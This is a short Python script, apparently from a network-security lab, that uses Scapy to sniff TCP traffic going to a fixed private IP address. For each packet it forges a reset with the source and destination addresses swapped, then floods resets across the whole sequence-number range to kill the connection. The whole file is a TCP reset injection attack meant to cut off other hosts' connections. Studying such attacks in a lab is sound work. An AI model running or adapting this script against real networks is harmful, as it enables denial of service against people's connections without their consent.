from scapy.all import *

target_ip = "192.168.13.30"

def pkt_callback(packet):
    if (TCP in packet):
        if (packet[IP].dst == target_ip):
            resetPkt = packet
            #set reset packet
            resetPkt[TCP].flags = 'R'
            #set ack number
            ack = resetPkt[TCP].ack
            dst = resetPkt[IP].dst
            src = resetPkt[IP].src
            resetPkt[TCP].ack = resetPkt[TCP].seq
            resetPkt[IP].src = dst
            resetPkt[IP].dst = src
            window = resetPkt[TCP].window
            num_packs = (2**32)/window
            #now enumerate through possible sequence numbers to try and kill the connection
            for i in range(int(num_packs)):
                seq = i*window
                resetPkt[TCP].seq = seq
                sendp(resetPkt)


interface = "ens10"
sniff(iface=interface, prn=pkt_callback, filter="tcp", store=0)
